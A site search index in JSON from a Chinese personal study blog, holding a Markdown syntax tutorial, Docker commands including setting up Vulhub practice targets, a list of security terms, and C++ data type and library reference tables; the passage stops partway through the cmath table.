{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"","text":"<p>\u6240\u6709\u7684\u575a\u6301\uff0c</p> <p>\u7ec8\u4f1a\u8ba9\u5e78\u8fd0\u4e0e\u4f60\u4e0d\u671f\u800c\u9047</p> <p>\u2014\u2014 \u6162\u6162\u6765\uff0c\u6bd4\u8f83\u5feb</p>"},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/","title":"Markdown\u6559\u7a0b","text":"<p>\uff08\u5f85\u5b8c\u5584\uff09</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#_1","title":"\u4e00\u3001\u57fa\u672c\u8bed\u6cd5","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#1","title":"1.\u6807\u9898","text":"<p>\u4f7f\u7528#\u53f7\u6807\u8bb0\uff0c\u53ef\u4ee5\u8868\u793a1-6\u7ea7\u6807\u9898\uff0c \u968f#\u7684\u4e2a\u6570\u9012\u589e\uff0c\u4e00\u7ea7\u6807\u9898\u5b57\u53f7\u6700\u5927\uff0c\u516d\u7ea7\u6807\u9898\u5b57\u53f7\u6700\u5c0f\u3002 \u4ee3\u7801\u5982\u4e0b\uff1a</p> Text Only<pre><code># \u4e00\u7ea7\u6807\u9898\n## \u4e8c\u7ea7\u6807\u9898\n### \u4e09\u7ea7\u6807\u9898\n#### \u56db\u7ea7\u6807\u9898\n##### \u4e94\u7ea7\u6807\u9898\n###### \u516d\u7ea7\u6807\u9898\n</code></pre>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#2","title":"2.\u5b57\u4f53","text":"<p>\u661f\u53f7\u4e0e\u4e0b\u5212\u7ebf\u90fd\u53ef\u4ee5\uff0c\u5355\u662f\u659c\u4f53\uff0c\u53cc\u662f\u7c97\u4f53\uff0c\u4e09\u662f\u7c97\u659c\u4f53</p> \u4ee3\u7801 \u6548\u679c <code>*\u8fd9\u662f\u659c\u4f53*</code> \u8fd9\u662f\u659c\u4f53 <code>_\u8fd9\u662f\u659c\u4f53_</code> \u8fd9\u662f\u659c\u4f53 <code>**\u8fd9\u662f\u7c97\u4f53**</code> \u8fd9\u662f\u7c97\u4f53 <code>__\u8fd9\u662f\u7c97\u4f53__</code> \u8fd9\u662f\u7c97\u4f53 <code>***\u8fd9\u662f\u7c97\u659c\u4f53***</code> \u8fd9\u662f\u7c97\u659c\u4f53 <code>___\u8fd9\u662f\u7c97\u659c\u4f53___</code> \u8fd9\u662f\u7c97\u659c\u4f53 <p>\u5feb\u6377\u952e\uff1a\u52a0\u7c97Ctrl+B  \u659c\u4f53Ctrl+I</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#3","title":"3. \u6362\u884c","text":"<p>Markdown\u6362\u884c\u7684\u65b9\u5f0f\u6709\u5f88\u591a\u79cd:</p> <ul> <li>\u76f4\u63a5\u5728\u4e00\u53e5\u8bdd\u540e\u6572\u4e24\u4e2a\u7a7a\u683c</li> <li>\u4e24\u53e5\u8bdd\u4e4b\u95f4\u52a0\u4e00\u4e2a\u7a7a\u884c</li> <li>\u5982\u679c\u4f60\u5728\u7f16\u8f91\u7684\u65f6\u5019\uff0c\u60f3\u8ba9\u4e00\u884c\u6587\u5b57\u5728\u663e\u793a\u7684\u65f6\u5019\u6362\u884c\uff0c\u5c31\u5728\u4e2d\u95f4\u52a0<code>&lt;br/&gt;</code></li> </ul>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#4","title":"4 .\u5f15\u7528","text":"<p>Markdown \u4e2d\u5f15\u7528\u901a\u8fc7\u7b26\u53f7 <code>&gt;</code> \u6765\u5b9e\u73b0\u3002<code>&gt;</code> \u7b26\u53f7\u540e\u7684\u7a7a\u683c\uff0c\u53ef\u6709\u53ef\u65e0\u3002 \u5728\u5f15\u7528\u7684\u533a\u5757\u5185\uff0c\u5141\u8bb8\u6362\u884c\u5b58\u5728\uff0c\u6362\u884c\u5e76\u4e0d\u4f1a\u7ec8\u6b62\u5f15\u7528\u7684\u533a\u5757\u3002\u5982\u679c\u8981\u7ed3\u675f\u5f15\u7528\uff0c\u9700\u8981\u4e00\u884c\u7a7a\u767d\u884c\uff0c\u6765\u7ed3\u675f\u5f15\u7528\u7684\u533a\u5757\u3002 \u4ee3\u7801\uff1a</p> <p>````&gt;\u8fd9\u662f\u4e00\u4e2a\u5f15\u7528\uff1a</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5f15\u7528</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5f15\u7528\u7684\u5f15\u7528</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5f15\u7528\u7684\u5f15\u7528\u7684\u5f15\u7528 ````</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#5","title":"5. \u94fe\u63a5","text":"<p><code>[\u94fe\u63a5\u540d\u79f0](\u94fe\u63a5\u5730\u5740) [\u94fe\u63a5\u540d\u79f0](\u94fe\u63a5\u5730\u5740) &lt;\u94fe\u63a5\u5730\u5740&gt; \u5373\u662f\uff1a [\u8fd9\u662f\u5c0f\u767d\u7684\u4e3b\u9875](https://coolzest.github.io)</code></p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#6-sss","title":"6. \u56fe\u7247sss","text":"<p><code>![\u56fe\u7247\u63cf\u8ff0\uff0c\u53ef\u5199\u53ef\u4e0d\u5199\uff0c\u4f46\u662f\u4e2d\u62ec\u53f7\u8981\u6709](\u56fe\u7247\u5730\u5740\uff0c\u672c\u5730\u94fe\u63a5\u6216\u8005URL\u5730\u5740\u3002#pic_center\u7a7a\u683c=\u957fx\u5bbd)</code></p> <p>\u6ce8\u610f\uff1a\u7b49\u53f7\u524d\u6709\u7a7a\u683c\uff0c\u662fx\u4e0d\u662f*</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#7","title":"7. \u5217\u8868","text":"<ul> <li>\u65e0\u5e8f\u5217\u8868\uff0c\u4f7f\u7528<code>*</code>\u3001<code>+</code>\u3001<code>-</code>\uff0c\u518d\u52a0\u4e00\u4e2a\u7a7a\u683c\u4f5c\u4e3a\u5217\u8868\u7684\u6807\u8bb0</li> <li>\u6709\u5e8f\u5217\u8868\uff0c\u4f7f\u7528\u6570\u5b57\u5e76\u52a0\u4e0a<code>.</code>\u53f7\uff0c\u518d\u52a0\u4e00\u4e2a\u7a7a\u683c\u4f5c\u4e3a\u5217\u8868\u7684\u6807\u8bb0</li> </ul> <p>```* \u65e0\u5e8f\u5217\u8868 1 + \u65e0\u5e8f\u5217\u8868 1 + \u65e0\u5e8f\u5217\u8868 2     + \u65e0\u5e8f\u5217\u8868 2.1     + \u65e0\u5e8f\u5217\u8868 2.2</p> <ol> <li>\u6709\u5e8f\u5217\u8868 1     1.1 \u6709\u5e8f\u5217\u8868 1.1</li> <li> <p>\u6709\u5e8f\u5217\u8868 2     2.1 \u6709\u5e8f\u5217\u88682.1 ```</p> </li> <li> <p>\u65e0\u5e8f\u5217\u8868</p> </li> <li> <p>\u65e0\u5e8f\u5217\u8868</p> <ul> <li>\u65e0\u5e8f\u5217\u8868</li> <li>\u65e0\u5e8f\u5217\u8868</li> </ul> </li> <li> <p>\u6709\u5e8f\u5217\u8868     1.1 \u6709\u5e8f\u5217\u8868</p> </li> <li>\u6709\u5e8f\u5217\u8868     2.1 \u6709\u5e8f\u5217\u8868</li> </ol>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#8","title":"8 .\u5206\u5272\u7ebf","text":"<p>\u53ef\u4ee5\u5728\u4e00\u884c\u4e2d\u7528\u4e09\u4e2a<code>-</code>or<code>*</code>\u6765\u5efa\u7acb\u4e00\u4e2a\u5206\u5272\u7ebf\uff01\uff01\uff01</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#9","title":"9. \u5220\u9664\u7ebf","text":"<p><code>~~\u8fd9\u662f\u8981\u88ab\u5220\u9664\u7684\u6587\u5b57~~</code> \u8fd9\u662f\u8981\u88ab\u5220\u9664\u7684\u6587\u5b57</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#10","title":"10. \u4e0b\u5212\u7ebf","text":"<p><code>&lt;u&gt;\u8fd9\u884c\u6587\u5b57\u5df2\u88ab\u6dfb\u52a0\u4e0b\u5212\u7ebf&lt;/u&gt;</code> \u8fd9\u884c\u6587\u5b57\u5df2\u88ab\u6dfb\u52a0\u4e0b\u5212\u7ebf</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#11","title":"11. \u4ee3\u7801\u5757","text":"<p>\u5355\u884c\uff1a`\uff0b\uff08\u8bed\u8a00\u7c7b\u578b\uff09+\u56de\u8f66</p> <p>\u591a\u884c\uff1a```\uff0b\uff08\u8bed\u8a00\u7c7b\u578b\uff09+\u56de\u8f66</p> <p>```cpp</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#include","title":"include <p>using namespace std; int main(){     cout&lt;&lt;\"Hello world!\"; } ```</p>","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#12","title":"12. \u8868\u683c","text":"<p>\u8868\u683c\u4f7f\u7528<code>|</code>\u6765\u5206\u5272\u4e0d\u540c\u7684\u5355\u5143\u683c\uff0c\u4f7f\u7528<code>-</code>\u6765\u5206\u9694\u8868\u5934\u548c\u5176\u4ed6\u884c</p> <ul> <li><code>:-</code>\uff1a\u5c06\u8868\u5934\u53ca\u5355\u5143\u683c\u5185\u5bb9\u5de6\u5bf9\u9f50</li> <li><code>-:</code>\uff1a\u5c06\u8868\u5934\u53ca\u5355\u5143\u683c\u5185\u5bb9\u53f3\u5bf9\u9f50</li> <li><code>:-:</code>\uff1a\u5c06\u8868\u5934\u53ca\u5355\u5143\u683c\u5185\u5bb9\u5c45\u4e2d</li> </ul> <p><code>| \u9879\u76ee        | \u4ef7\u683c   |  \u6570\u91cf  | | --------   | -----:  | :----:  | | \u8ba1\u7b97\u673a     | \\$1600 |   5     | | \u624b\u673a        |   \\$12   |   12   | | \u7ba1\u7ebf        |    \\$1    |  234  |</code></p> \u9879\u76ee \u4ef7\u683c \u6570\u91cf \u8ba1\u7b97\u673a $1600 5 \u624b\u673a $12 12 \u7ba1\u7ebf $1 234","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#13","title":"13.\u811a\u6ce8","text":"<p>``` \u4f7f\u7528 Markdown<sup>1</sup>\u53ef\u4ee5\u6548\u7387\u7684\u4e66\u5199\u6587\u6863, \u76f4\u63a5\u8f6c\u6362\u6210 HTML<sup>2</sup>, \u4f60\u53ef\u4ee5\u4f7f\u7528 Typora<sup>3</sup> \u7f16\u8f91\u5668\u8fdb\u884c\u4e66\u5199\u3002</p> <p>\u6ce8\u610f\uff1a\u811a\u6ce8\u81ea\u52a8\u88ab\u642c\u8fd0\u5230\u6700\u540e\u9762\uff0c\u8bf7\u5230\u6587\u7ae0\u672b\u5c3e\u67e5\u770b\uff0c\u5e76\u4e14\u811a\u6ce8\u540e\u65b9\u7684\u94fe\u63a5\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u56de\u5230\u52a0\u6ce8\u7684\u5730\u65b9\u3002</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#14","title":"14.\u7279\u6b8a\u7b26\u53f7","text":"<p>\u5bf9\u4e8eMarkdown\u4e2d\u7684\u8bed\u6cd5\u7b26\u53f7\uff0c\u524d\u9762\u5bb6\u53cd\u659c\u7ebf<code>\\</code>\u5373\u53ef\u4ee5\u663e\u793a\u7b26\u53f7\u672c\u8eab\u3002</p>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#_2","title":"\u4e8c\u3001\u9ad8\u7ea7\u7528\u6cd5","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#1_1","title":"1.\u4ee3\u529e\u4e8b\u9879","text":"<p><code>- [ ] \u652f\u6301\u4ee5 PDF \u683c\u5f0f\u5bfc\u51fa\u6587\u7a3f - [ ] \u6539\u8fdb Cmd \u6e32\u67d3\u7b97\u6cd5\uff0c\u4f7f\u7528\u5c40\u90e8\u6e32\u67d3\u6280\u672f\u63d0\u9ad8\u6e32\u67d3\u6548\u7387 - [x] \u65b0\u589e Todo \u5217\u8868\u529f\u80fd - [x] \u4fee\u590d LaTex \u516c\u5f0f\u6e32\u67d3\u95ee\u9898 - [x] \u65b0\u589e LaTex \u516c\u5f0f\u7f16\u53f7\u529f\u80fd</code></p> <ul> <li> \u652f\u6301\u4ee5 PDF \u683c\u5f0f\u5bfc\u51fa\u6587\u7a3f</li> <li> \u6539\u8fdb Cmd \u6e32\u67d3\u7b97\u6cd5\uff0c\u4f7f\u7528\u5c40\u90e8\u6e32\u67d3\u6280\u672f\u63d0\u9ad8\u6e32\u67d3\u6548\u7387</li> <li> \u65b0\u589e Todo \u5217\u8868\u529f\u80fd</li> <li> \u4fee\u590d LaTex \u516c\u5f0f\u6e32\u67d3\u95ee\u9898</li> <li> \u65b0\u589e LaTex \u516c\u5f0f\u7f16\u53f7\u529f\u80fd</li> </ul>","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#2_1","title":"2.\u7ed8\u5236\u6d41\u7a0b\u56fe","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#3_1","title":"3.\u7ed8\u5236\u5e8f\u5217\u56fe","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#4_1","title":"4.\u7ed8\u5236\u7518\u7279\u56fe","text":"","tags":["Markdown"]},{"location":"2024-04-22-Markdown%E7%AC%94%E8%AE%B0/#_3","title":"\u4e09\u3001\u6570\u5b66\u516c\u5f0f","text":"<p>regards.</p>          coolzest      <ol> <li> <p>Markdown\u662f\u4e00\u79cd\u7eaf\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u00a0\u21a9</p> </li> <li> <p>HyperText Markup Language \u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u00a0\u21a9</p> </li> <li> <p>NEW WAY TO READ &amp; WRITE MARKDOWN. ```\u00a0\u21a9</p> </li> </ol>","tags":["Markdown"]},{"location":"2024-08-16-Docker/","title":"2024 08 16 Docker","text":""},{"location":"2024-08-16-Docker/#docker","title":"Docker \u4f7f\u7528\u6307\u5357","text":""},{"location":"2024-08-16-Docker/#_1","title":"\u4e00\u3001\u5e38\u89c1\u547d\u4ee4","text":"<ul> <li>\u7a97\u53e3\u53d8\u5927: <code>ctrl shift +</code></li> <li>\u7a97\u53e3\u53d8\u5c0f: <code>ctrl -</code></li> <li>\u6e05\u5c4f: <code>ctrl + L</code> </li> <li>\u5207\u6362\u5230 root \u7528\u6237: <code>sudo su</code></li> <li>\u83b7\u53d6 IP \u5730\u5740: <code>ip addr</code> \u6216 <code>ifconfig</code></li> <li>\u5f00\u542f ssh \u670d\u52a1: <code>systemctl start ssh</code></li> </ul>"},{"location":"2024-08-16-Docker/#docker_1","title":"\u4e8c\u3001Docker \u7684\u5b89\u88c5\u548c\u4f7f\u7528","text":"<ul> <li>\u955c\u50cf (Images): \u5e94\u7528\u7a0b\u5e8f\u7684\u9759\u6001\u6587\u4ef6\uff0c\u7c7b\u4f3c\u865a\u62df\u673a\u7684\u7cfb\u7edf\u955c\u50cf</li> <li>\u5bb9\u5668 (Containers): \u8fd0\u884c\u72b6\u6001\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u7c7b\u4f3c\u5b89\u88c5\u597d\u7684\u865a\u62df\u673a\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u955c\u50cf\u4e0e\u5bb9\u5668\u90fd\u662f\u7a7a\u7684\u3002</li> <li>\u955c\u50cf\u8d44\u6e90\u7f51\u7ad9: Docker Hub\uff08\u9700\u5916\u7f51\u8bbf\u95ee\uff09</li> <li>\u66f4\u6362\u52a0\u901f\u5668\u6e90: <code>mousepad /etc/docker/daemon.json</code> </li> <li>\u5b89\u88c5 Docker: <code>apt install docker.io</code></li> <li>\u5f00\u542f Docker \u670d\u52a1: <code>systemctl start docker</code> \u6216  <code>systemctl restart docker.service</code> </li> <li>\u5173\u95ed Docker \u670d\u52a1: <code>systemctl stop docker.socket</code>  \u6216  <code>systemctl stop docker.service</code> </li> <li>\u67e5\u770b\u955c\u50cf: <code>docker images</code></li> <li>\u67e5\u770b\u5bb9\u5668: <code>docker ps -a</code></li> <li>\u4e0b\u8f7d\u955c\u50cf: <code>docker pull &lt;\u955c\u50cf\u540d\u79f0&gt;</code> eg</li> <li> <p>\u8fd0\u884c\u955c\u50cf: <code>docker run -dit --name=&lt;\u540d\u5b57&gt; -p &lt;\u4e3b\u673a\u7aef\u53e3&gt;:&lt;\u5bb9\u5668\u7aef\u53e3&gt; &lt;\u955c\u50cf\u540d&gt;</code></p> </li> <li> <p>\u5f00\u542f\u5bb9\u5668: <code>docker start &lt;\u5bb9\u5668\u540d&gt;</code></p> </li> <li>\u5173\u95ed\u5bb9\u5668: <code>docker stop &lt;\u5bb9\u5668\u540d&gt;</code></li> <li>\u91cd\u542f\u5bb9\u5668: <code>docker restart &lt;\u5bb9\u5668\u540d&gt;</code></li> <li>\u8fdb\u5165\u5bb9\u5668: <code>docker exec -it &lt;\u5bb9\u5668\u540d&gt; bash</code></li> <li>\u9000\u51fa\u5bb9\u5668: <code>exit</code></li> <li>\u5220\u9664\u5bb9\u5668: <code>docker rm &lt;\u5bb9\u5668\u540d&gt;</code></li> <li>\u5220\u9664\u955c\u50cf: <code>docker rmi &lt;\u955c\u50cf\u540d&gt;</code></li> </ul>"},{"location":"2024-08-16-Docker/#docker-compose","title":"\u4e09\u3001Docker Compose \u81ea\u52a8\u7ba1\u7406\u5bb9\u5668","text":"<ul> <li>\u5b89\u88c5 Docker Compose: <code>apt install docker-compose</code></li> <li> <p>\u4e0b\u8f7d\u5e38\u89c1\u6f0f\u6d1e\u9776\u6807Vulhub\u96c6\u5408: <code>git clone https://github.com/vulhub/vulhub.git</code></p> </li> <li> <p>\u642d\u5efa\u5bb9\u5668: 1.<code>cd vulhub</code>2. <code>ls</code>3.<code>cd &lt;\u9776\u6807\u7d22\u5f15&gt;</code> 4.<code>docker-compose up -d</code></p> </li> <li>\u67e5\u770b\u5bb9\u5668\u4fe1\u606f: <code>docker ps</code></li> <li>\u5173\u95ed\u5bb9\u5668: <code>docker-compose down</code></li> </ul>"},{"location":"2024-08-17-%E5%9F%BA%E7%A1%80%20-%20%E5%89%AF%E6%9C%AC/","title":"2024 08 17 \u57fa\u7840   \u526f\u672c","text":"<p>\u57fa\u7840</p> <p>\u524d\u540e\u7aef\uff0cPOc/ExP\uff0cPayload/Shellcode\uff0c\u540e\u95e8/Webshell\uff0c\u6728\u9a6c/\u75c5\u6bd2 \u53cd\u5f39\uff0c\u56de\u663e\uff0c\u8df3\u677f\uff0c\u9ed1\u767d\u76d2\u6d4b\u8bd5\uff0c\u66b4\u529b\u7834\u89e3\uff0c\u793e\u4f1a\u5de5\u7a0b\u5b66\uff0c\u649e\u5e93\uff0cATT&amp;CK\u7b49 \u53c2\u8003\uff1a</p>"},{"location":"blog/posts/myfirst/","title":"Happy new years eve!","text":"<p>We hope you are all having fun and wish you all the best for the new year!</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>"},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/","title":"C++\u57fa\u7840","text":"<p>\uff08\u5f85\u5b8c\u5584\uff09</p>","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#_1","title":"\u4e00\u3001\u57fa\u672c\u6570\u636e\u7c7b\u578b","text":"<p>sizeof\uff08\u6570\u636e\u7c7b\u578b\uff09\u53ef\u8fd4\u56de\u5b57\u8282\u957f</p> \u6570\u636e\u7c7b\u578b \u5927\u5c0f\uff08\u5b57\u8282\uff09 \u8303\u56f4 <code>bool</code> 1 <code>true</code> \u6216 <code>false</code> <code>char</code> 1 -128 \u5230 127 \u6216 0 \u5230 255 <code>signed char</code> 1 -128 \u5230 127 <code>unsigned char</code> 1 0 \u5230 255 <code>short</code> 2 -32,768 \u5230 32,767 <code>unsigned short</code> 2 0 \u5230 65,535 <code>int</code> 4 -2,147,483,648 \u5230 2,147,483,647 <code>unsigned int</code> 4 0 \u5230 4,294,967,295 <code>long</code> 4 \u6216 8 -2,147,483,648 \u5230 2,147,483,647 \u6216\u66f4\u5927 <code>unsigned long</code> 4 \u6216 8 0 \u5230 4,294,967,295 \u6216\u66f4\u5927 <code>long long</code> 8 -(2^63) \u5230 (2^63)-1 <code>unsigned long long</code> 8 0 \u5230 (2^64)-1 <code>float</code> 4 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 7 \u4f4d\u6709\u6548\u6570\u5b57 <code>double</code> 8 \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 15 \u4f4d\u6709\u6548\u6570\u5b57 <code>long double</code> 8 \u6216 12 \u6216 16 \u6269\u5c55\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 19 \u4f4d\u6709\u6548\u6570\u5b57 <code>void</code> \u7a7a\u7c7b\u578b\uff0c\u901a\u5e38\u7528\u4e8e\u51fd\u6570\u4e0d\u8fd4\u56de\u503c\u7684\u60c5\u51b5 <code>wchar_t</code> 2 \u6216 4 \u53d6\u51b3\u4e8e\u7f16\u8bd1\u5668\u548c\u5e73\u53f0\uff0c\u901a\u5e38\u7528\u4e8e\u5bbd\u5b57\u7b26\u8868\u793a\u6cd5","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includeiomanip","title":"\u4e8c\u3001include<code>&lt;iomanip&gt;</code>","text":"","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#1","title":"1\u3001\u5e03\u5c14\u6807\u5fd7\u548c\u6570\u5b57\u683c\u5f0f\u5316","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>boolalpha</code> \u5c06\u5e03\u5c14\u503c\u8f93\u51fa\u4e3a <code>true</code> \u6216 <code>false</code> \u800c\u4e0d\u662f <code>1</code> \u6216 <code>0</code>\u3002 <code>noboolalpha</code> \u53d6\u6d88 <code>boolalpha</code> \u7684\u6548\u679c\u3002 <code>showbase</code> \u5728\u8f93\u51fa\u6574\u6570\u65f6\u663e\u793a\u57fa\u6570\uff08\u5982\u5341\u516d\u8fdb\u5236\u524d\u7f00 <code>0x</code>\uff09\u3002 <code>noshowbase</code> \u53d6\u6d88 <code>showbase</code> \u7684\u6548\u679c\u3002 <code>showpoint</code> \u5f3a\u5236\u8f93\u51fa\u6d6e\u70b9\u6570\u7684\u5c0f\u6570\u70b9\u548c\u5c3e\u968f\u7684\u96f6\u3002 <code>noshowpoint</code> \u53d6\u6d88 <code>showpoint</code> \u7684\u6548\u679c\u3002 <code>showpos</code> \u5728\u6b63\u6570\u524d\u663e\u793a\u52a0\u53f7\u3002 <code>noshowpos</code> \u53d6\u6d88 <code>showpos</code> \u7684\u6548\u679c\u3002","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#2","title":"2\u3001\u8f93\u51fa\u6d41\u63a7\u5236","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>setw(int n)</code> \u8bbe\u7f6e\u5b57\u6bb5\u5bbd\u5ea6\u4e3a <code>n</code>\u3002 <code>setprecision(int n)</code> \u8bbe\u7f6e\u6d6e\u70b9\u6570\u7cbe\u5ea6\u4e3a <code>n</code>\u3002 <code>setfill(char c)</code> \u8bbe\u7f6e\u586b\u5145\u5b57\u7b26\u4e3a <code>c</code>\u3002 <code>left</code> \u5de6\u5bf9\u9f50\u8f93\u51fa\u3002 <code>right</code> \u53f3\u5bf9\u9f50\u8f93\u51fa\u3002 <code>internal</code> \u5728\u7b26\u53f7\u548c\u6570\u503c\u4e4b\u95f4\u586b\u5145\u7b26\u53f7\u3002 <code>fixed</code> \u4ee5\u56fa\u5b9a\u70b9\u683c\u5f0f\u8f93\u51fa\u6d6e\u70b9\u6570\u3002 <code>scientific</code> \u4ee5\u79d1\u5b66\u8bb0\u6570\u6cd5\u8f93\u51fa\u6d6e\u70b9\u6570\u3002 <code>hex</code> \u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u30020x\u5f00\u5934 <code>oct</code> \u4ee5\u516b\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u30020\u5f00\u5934 <code>dec</code> \u4ee5\u5341\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u3002 <code>setiosflags(flag)</code> \u8bbe\u7f6e\u6d41\u6807\u5fd7\u3002 <code>resetiosflags(flag)</code> \u91cd\u7f6e\u6d41\u6807\u5fd7\u3002 <code>setbase(base)</code> \u8bbe\u7f6e\u6574\u6570\u8f93\u51fa\u7684\u57fa\u6570\u3002 <code>setfill(c)</code> \u8bbe\u7f6e\u586b\u5145\u5b57\u7b26\u3002 <code>flush</code> \u5237\u65b0\u8f93\u51fa\u6d41\u3002","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#3","title":"3\u3001\u8f93\u5165\u6d41\u63a7\u5236","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>skipws</code> \u8df3\u8fc7\u8f93\u5165\u65f6\u7684\u7a7a\u767d\u5b57\u7b26\u3002 <code>noskipws</code> \u53d6\u6d88 <code>skipws</code> \u7684\u6548\u679c\u3002","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includecmath","title":"\u4e09\u3001include<code>&lt;cmath&gt;</code>","text":"\u51fd\u6570\u539f\u578b \u63cf\u8ff0 <code>double sin(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u6b63\u5f26\u503c\u3002 <code>double cos(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u4f59\u5f26\u503c\u3002 <code>double tan(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u6b63\u5207\u503c\u3002 <code>double asin(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u6b63\u5f26\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double acos(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u4f59\u5f26\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double atan(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u6b63\u5207\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double exp(double x);</code> \u8ba1\u7b97 <code>e</code> \u7684 <code>x</code> \u6b21\u5e42\u3002 <code>double log(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u81ea\u7136\u5bf9\u6570\uff08\u4ee5 <code>e</code> \u4e3a\u5e95\uff09\u3002 <code>double log10(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u5e38\u7528\u5bf9\u6570\uff08\u4ee5 <code>10</code> \u4e3a\u5e95\uff09\u3002 <code>double log2(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u4e8c\u8fdb\u5236\u5bf9\u6570\uff08\u4ee5 <code>2</code> \u4e3a\u5e95\uff09\u3002 <code>double pow(double x, double y);</code> \u8ba1\u7b97 <code>x</code> \u7684 <code>y</code> \u6b21\u5e42\u3002 <code>double sqrt(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u5e73\u65b9\u6839\u3002 <code>double cbrt(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7acb\u65b9\u6839\u3002 <code>double ceil(double x);</code> \u5411\u4e0a\u53d6\u6574\uff0c\u8fd4\u56de\u4e0d\u5c0f\u4e8e <code>x</code> \u7684\u6700\u5c0f\u6574\u6570\u3002 <code>double floor(double x);</code> \u5411\u4e0b\u53d6\u6574\uff0c\u8fd4\u56de\u4e0d\u5927\u4e8e <code>x</code> \u7684\u6700\u5927\u6574\u6570\u3002 <code>double round(double x);</code> \u56db\u820d\u4e94\u5165\uff0c\u8fd4\u56de\u6700\u63a5\u8fd1\u7684\u6574\u6570\u503c\u3002 <code>int abs(int x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7edd\u5bf9\u503c\u3002 <code>double fabs(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7edd\u5bf9\u503c\uff08\u9002\u7528\u4e8e\u6d6e\u70b9\u6570\uff09\u3002 <code>double max(double x, double y);</code> \u8fd4\u56de <code>x</code> \u548c <code>y</code> \u4e2d\u7684\u6700\u5927\u503c\u3002 <code>double min(double x, double y);</code> \u8fd4\u56de <code>x</code> \u548c <code>y</code> 